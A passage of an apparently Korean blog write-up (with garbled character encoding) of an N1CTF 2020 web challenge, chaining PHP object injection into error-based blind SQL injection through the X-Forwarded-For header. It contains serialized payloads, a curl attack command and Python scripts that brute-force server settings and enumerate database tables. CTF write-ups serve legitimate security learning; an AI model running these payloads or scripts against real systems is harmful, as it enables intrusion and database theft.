ì‹¤í–‰ì´ ë˜ë©´ <code>$ip</code>ì˜ ê°’ì„ <code>$this-&gt;ip</code>ë¡œ ë„£ì–´ì£¼ê³ , ê·¸ë‹¤ìŒ <code>__wakeup()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ëŠ” ë° ì´ë•Œ <code>$this-&gt;ip</code>ì˜ ê°’ì´ <code>n1ctf</code>ì´ë©´ <code>welcome to n1ctf2020</code>ë¡œ ê°’ì„ ë°”ê¾¸ê³ , <code>$this-&gt;ip</code>ì˜ ê°’ì´ <code>n1ctf</code>ê°€ ì•„ë‹ˆë©´ <code>noip</code>ë¡œ ê°’ì„ ë°”ê¿‰ë‹ˆë‹¤.</p><p>ê·¸ë¦¬ê³  <code>__destruct()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ë˜ë©´ì„œ <code>getflag()</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ì´ ë˜ëŠ”ë°, ì´ë•Œ <code>getflag()</code> í•¨ìˆ˜ì—ì„œ <code>md5($this-&gt;check)</code>ì˜ ê°’ì´ <code>Key</code> ê°’ê³¼ ë™ì¼í•˜ë©´ <code>/flag</code> íŒŒì¼ì„ ì½ì–´ FLAGë¥¼ ë¦¬í„´í•´ì£¼ê³ , ê°’ì´ ë™ì¼í•˜ì§€ ì•Šìœ¼ë©´ <code>$this-&gt;i</code>pì˜ ê°’ì„ ë¦¬í„´í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìœ„ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë¶„ì„í•œ ê²°ê³¼ ì´ë²ˆ ë¬¸ì œì˜ ìš”ì ì€ <code>Ke</code>y ê°’ì„ ì°¾ê³ , í•´ë‹¹ <code>Key</code> ê°’ ê¸°ë°˜ìœ¼ë¡œ POIë¥¼ í•´ì„œ FLAGë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì¸ ê±° ê°™ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë©´ Key ê°’ì€ ë‚´ë¶€ ì„œë²„ì— ìˆëŠ” ì†ŒìŠ¤ ì½”ë“œì—ì„œë§Œ ë³¼ ìˆ˜ ìˆì„ ê±° ê°™ì•„ì„œ index.php íŒŒì¼ì„ ë¦­ í•´ì•¼ í•œë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤.</p><p>ì—¬ê¸°ì„œ ì²« ë²ˆì§¸ ë‚œê°„, SQLIë¥¼ ì–´ë–»ê²Œ í•˜ì§€? POI -&gt; SQLI?</p><p>SQL ë¡œì§ì´ ê·¸ëƒ¥ ì£¼ì–´ì§€ì§„ ì•Šì•˜ì„ ê²ƒ ê°™ì•„ì„œ SQLIì„ ì˜ì‹¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ <code>ip</code> í´ë˜ìŠ¤ì—ì„œ <code>__toString()</code> ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ë¸”ë¼ì¸ë“œ <code>SQL ì¸ì ì…˜</code>ì„ í†µí•´ íŒŒì¼ì„ ì°¾ê³ , íŒŒì¼ì„ ë¦­ í•œë‹¤ë©´ í•´ë‹¹ Keyë¡œ FLAGë¥¼ ì°¾ëŠ” ë°©ë²•ìœ¼ë¡œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ë¨¼ì € êµ¬ì„±í–ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/t2kvu/btqK83qQ8VI/MBhwxD4ZlaFTQRC94WNLA1/img.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;ip&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ ìœ„ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì„œ ë³´ë‚´ ë³´ì•˜ì§€ë§Œ ì˜ˆìƒê³¼ ë‹¤ë¥´ê²Œ SQL ì—ëŸ¬ë„ ì¶œë ¥ì´ ë˜ì§€ ì•Šì•˜ê³ , <code>your ip looks ok!</code>ì´ë¼ëŠ” ë¬¸êµ¬ë„ ì¶œë ¥ì´ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ì¦‰, <code>__toString()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ì§€ ì•Šì€ ê²ƒì…ë‹ˆë‹¤.</p><p>ìŒ.. <code>__toString()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ì§€ ì•Šì€ ì´ìœ ëŠ” ë­.. í•˜ë‚˜ ì¼ ê²ƒì…ë‹ˆë‹¤. í•´ë‹¹ í´ë˜ìŠ¤ê°€ <code>ë¬¸ìì—´</code>ë¡œ ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— <code>__toString()</code> ë©”ì„œë“œê°€ ë°˜ì‘ì„ í•˜ì§€ ì•ŠëŠ” ê²ƒì…ë‹ˆë‹¤.</p><p>ê·¸ëŸ°ë° <code>flag</code> í´ë˜ìŠ¤ì—ì„œ <code>stristr()</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ë§Œì•½ <code>$this-&gt;ip</code>ì˜ ê°’ìœ¼ë¡œ <code>ip</code> í´ë˜ìŠ¤ë¥¼ ë„˜ê²¨ì£¼ë©´ ì–´ë–»ê²Œ ë ê¹Œ ìƒê°ì„ í•´ë³¸ ê²°ê³¼, ë¬¸ìì—´ í•¨ìˆ˜ë¡œ í´ë˜ìŠ¤ê°€ ë“¤ì–´ê°€ë©´ í•´ë‹¹ í´ë˜ìŠ¤ë„ ë¬¸ìì—´ë¡œ ì²˜ë¦¬ê°€ ë˜ëŠ” ê±°ê² ì§€?ë¼ê³  ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ <code>stristr()</code> í•¨ìˆ˜ì—ì„œ <code>__toString()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ë©´ <code>$this-&gt;ip</code>ì˜ ê°’ìœ¼ë¡œ <code>mysqli Error</code>ë¥¼ ë¦¬í„´ ë°›ê±°ë‚˜, <code>your ip looks ok!</code>ë¼ëŠ” ë¬¸êµ¬ë¥¼ ë¦¬í„´ì„ ë°›ì„ ê²ƒì´ê³ , ê·¸ëŸ¼ í•­ìƒ <code>noip</code> ë¬¸êµ¬ê°€ ì¶œë ¥ì´ ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ê·¸ë˜ì„œ SQL ì¿¼ë¦¬ë¥¼ ì¡°ì‘í•´ì„œ IFë¬¸ì„ ì‚¬ìš©í•´ ì¿¼ë¦¬ê°€ ì°¸ì´ë©´ ì—ëŸ¬ë¥¼ ì¶œë ¥ì‹œí‚¤ê²Œ í•˜ê³ , í•´ë‹¹ ì—ëŸ¬ì— <code>n1ctf</code> ë¬¸ìê°€ ì¶œë ¥ì´ ë˜ê²Œ í•˜ë©´ ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜ì´ ê°€ëŠ¥í•˜ì§€ ì•Šì„ê¹Œ ìƒê°ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤. stristr() í•¨ìˆ˜ëŠ” <code>n1ctf</code>ë¼ëŠ” ë¬¸ìì—´ì˜ íŒ¨í„´ë§Œ ì¡´ì¬í•´ë„ ì°¸ìœ¼ë¡œ ì¸ì‹í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ <code>afwefwfn1ctf</code>ë¼ëŠ” ê°’ì´ ë“¤ì–´ì™€ë„ í•´ë‹¹ ê°’ì—ëŠ” <code>n1ctf</code>ë¼ëŠ” íŒ¨í„´ì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ì°¸ìœ¼ë¡œ ì²˜ë¦¬ê°€ ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ê·¸ë˜ì„œ <code>mysql</code>ì—ì„œ ì—ëŸ¬ì— ë‚´ê°€ ì›í•˜ëŠ” ê°’ì„ ì–´ë–»ê²Œ ë„£ì–´ì£¼ì§€ ìƒê°ì„ í•´ë³´ë‹¤ê°€, ì–¼ë§ˆ ì „ì— <code>exp()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•œ Error Blind Based SQL Injection ê¸€ì„ ì‘ì„±í•˜ë©´ì„œ exp() í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œ ê²ƒì´ ìƒê°ë‚¬ìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/Fl7sF/btqK70ajhMF/fCXjSjcKyHtlrUR5mJAkz0/img.png"></p><p>ê·¸ë˜ì„œ <code>mysql</code>ì—ì„œ í…ŒìŠ¤íŠ¸ë¥¼ í•´ë³´ë‹ˆ ì—­ì‹œë‚˜ ì—ëŸ¬ë¥¼ ë³´ë‹ˆ <code>n1ctf</code>ë¼ëŠ” ë¬¸ìì—´ì´ ë“¤ì–´ê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì—ëŸ¬ë¥¼ ë‚´ë±‰ëŠ” ì´ìœ ëŠ” exp() í•¨ìˆ˜ì— Max Valueê°€ 709ì…ë‹ˆë‹¤. </p><p>710ë¶€í„°ëŠ” ì˜¤ë²„í”Œë¡œìš°ê°€ ì¼ì–´ë‚˜ ì—ëŸ¬ë¥¼ ë‚´ ë±‰ê²Œ ë˜ëŠ” ë°, ìœ„ ì‚¬ì§„ì„ ë³´ë©´ <code>709 * length(&quot;n1ctf&quot;)</code>ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>length(&quot;n1ctf&quot;)</code>ì˜ ê°’ì€ 5ì´ë¯€ë¡œ 709 * 5ê°€ ë˜ì–´ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•´ ì—ëŸ¬ë¥¼ ë‚´ë±‰ëŠ” ê²ƒì´ê³ , í•´ë‹¹ ì—ëŸ¬ëŠ” ì‚¬ìš©ìê°€ ì…ë ¥í•œ exp() í•¨ìˆ˜ë¥¼ ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì£¼ê¸° ë•Œë¬¸ì— ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê°’ì„ ì—ëŸ¬ì— í¬í•¨ì‹œí‚¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POI Payload Used : O:4:&quot;flag&quot;:1:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:0:&#123;&#125;&#125;</span><br><span class="line">SQLI Payload Used : &#39;,if(1&#x3D;1, exp(709 * length(&quot;n1ctf&quot;)), &quot;False&quot;))#</span><br></pre></td></tr></table></figure><p>ìœ„ì™€ ê°™ì´ ê°’ì„ ë³´ë‚´ê²Œ ë˜ë©´ ì¼ë‹¨ POI Payloadì— ì˜í•´ì„œ <code>__toString()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë  ê²ƒì…ë‹ˆë‹¤. (ì´ìœ ëŠ” ìœ„ì—) ê·¸ë¦¬ê³  <code>X-Forwarded-for</code>ì˜ ê°’ìœ¼ë¡œ SQLI Payloadë¥¼ ë³´ë‚´ì£¼ë©´ Insert ë¬¸ì— ë“¤ì–´ê°ˆ ê²ƒ ì´ê¸° ë•Œë¬¸ì— Injectionì´ ì¼ì–´ë‚  ê²ƒì…ë‹ˆë‹¤.</p><p>SQLI Payloadë¥¼ ë³´ë©´ ifë¬¸ ì¡°ê±´ì´ 1=1ìœ¼ë¡œ ì°¸ì´ë¯€ë¡œ, ì—ëŸ¬ì— <code>n1ctf</code> ë¬¸êµ¬ê°€ í¬í•¨ë˜ì–´ ë¦¬í„´ì´ ë  ê²ƒì…ë‹ˆë‹¤. í•´ë‹¹ ë¦¬í„´ ê°’ì€ <code>stristr()</code> í•¨ìˆ˜ì˜  <code>$this-&gt;ip</code>ë¡œ ë“¤ì–´ê°€ê³ , <code>$this-&gt;ip</code>ì—ëŠ” <code>n1ctf</code> ë¬¸êµ¬ê°€ í¬í•¨ë˜ì–´ ìˆì–´ <code>welcome to n1ctf2020</code>ì´ ì¶œë ¥ì´ ë  ê²ƒì…ë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/BPeP3/btqK6B3CNsz/1AlxnouxJ8L7TO9JKfU8pK/img.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command : curl -i -g --header &quot;X-Forwarded-for: &#39;,if(1&#x3D;1, exp(709 * length(&#39;n1ctf&#39;)), &#39;False&#39;))#&quot; http:&#x2F;&#x2F;101.32.205.189&#x2F;?input&#x3D;O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ <code>curl</code> ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ì„œ <code>POI -&gt; SQLI</code> ê³µê²©ì„ í•´ë³´ë‹ˆ ì¡°ê±´ì´ ë”± ë§ì•„ <code>welcome to n1ctf2020</code>ì´ ì¶œë ¥ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì œ ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ <code>load_file()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ index.php íŒŒì¼ì„ ë¦­ í•˜ê¸°ë§Œ í•˜ë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤!</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cmhkpv/btqK83LcqPw/NvMFdQL2fLyDbRX3KSCI21/img.png"></p><p>ê·¸ëŸ°ë° <code>load_file()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ <code>index.php</code> íŒŒì¼ì„ ë¦­ í•´ë³´ë ¤ê³  í–ˆì§€ë§Œ ì˜ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê²€ìƒ‰ì„ í•´ë³´ë‹ˆ <code>secure_file_priv</code> ì˜µì…˜ì„ ì´ìš©í•´ì„œ ë””ë ‰í„°ë¦¬ë¥¼ ì œì–´í•  ìˆ˜ ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ê²€ìƒ‰ì„ í•´ë³´ë‹ˆ <code>@@global.secure_file_priv</code>ë¥¼ ì°¸ì¡°í•´ì„œ ì œì–´í•˜ê³  ìˆëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ë³¼ ìˆ˜ ìˆëŠ” ê±° ê°™ì•„ì„œ ì´ë¥¼ ë¸”ë¼ì¸ë“œ ì¸ì ì…˜ì„ ì´ìš©í•´ì„œ ë½‘ì•„ë³´ì•˜ìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://101.32.205.189/?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125;&quot;</span></span><br><span class="line">Length , path= <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-for&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((SELECT length(@@global.secure_file_priv))=&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)), &#x27;False&#x27;))#&quot;</span></span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">Length = i</span><br><span class="line">print(<span class="string">&quot;[+] secure_file_priv Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Length):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>, <span class="number">123</span>):</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((SELECT @@global.secure_file_priv),&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;, exp(709 * length(&#x27;n1ctf&#x27;)), &#x27;False&#x27;))#&quot;</span></span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">path += <span class="built_in">chr</span>(j).lower()</span><br><span class="line">print(<span class="string">&quot;[+] secure_file_priv : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cVMXwj/btqLbmjp46q/7gIYYWE5cTMmTEKfTg5pBK/img.png"></p><p>ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ëŒë ¤ë³´ë‹ˆ <code>@@global.secure_file_priv</code> ê°’ì´ <code>/var/lib/mysql/files</code>ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë ‡ê¸° ë•Œë¬¸ì— <code>/var/www/html</code>ì— ìˆëŠ” index.php íŒŒì¼ì„ ë¦­í•  ìˆ˜ ì—†ì—ˆë˜ ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ì´ë²ˆ ë¬¸ì œëŠ” SQLIë¥¼ ì´ìš©í•´ì„œ Key ê°’ì„ ì°¾ëŠ” ê±° ì™¸ì—ëŠ” ë°©ë²•ì´ ì—†ëŠ” ê±° ê°™ì•„ì„œ DBë¥¼ ê·¸ëƒ¥ í„¸ê¸°ë¡œ ë§ˆìŒë¨¹ì—ˆìŠµë‹ˆë‹¤. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">table_1, table_len2, table_2, column_len1, column_len2, column1, column2, key_len, key = <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name1</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_1</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select table_name from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 0, 1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>, <span class="number">122</span>):</span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))&#125; </span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_1 += <span class="built_in">chr</span>(j)</span><br><span class="line">print(<span class="string">&quot;[+] One_Table_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_1.lower()))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_len2</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_len2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(table_name) from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 1,1) =&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i)</span><br><span class="line">res = requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_len2 = i</span><br><span class="line">print(<span class="string">&quot;[+] Two_Table_Name Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(table_len2)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name2</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select table_name from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 1, 1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(table_len2):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>, <span class="number">122</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_2 += <span class="built_in">chr</span>(j).lower()</span><br><span class="line">print(<span class="string">&quot;[+] Two_Table_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_2))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name2_column</span>():</span></span><br><span class="line"><span class="keyword">global</span> column_len1, column_len2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(column_name) from information_schema.columns where table_schema =&#x27;n1ctf_websign&#x27; and table_name = &#x27;&#123;&#125;&#x27; limit &#123;&#125;,1) =&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, j, i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">column_len1 = i</span><br><span class="line"><span class="keyword">elif</span> j == <span class="number">1</span>:</span><br><span class="line">column_len2 = i</span><br><span class="line">print(<span class="string">&quot;[+] &#123;&#125;, &#123;&#125;_Column_Name Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_2, <span class="built_in">str</span>(j+<span class="number">1</span>), <span class="built_in">str</span>(i)))</span><br><span class="line"><span 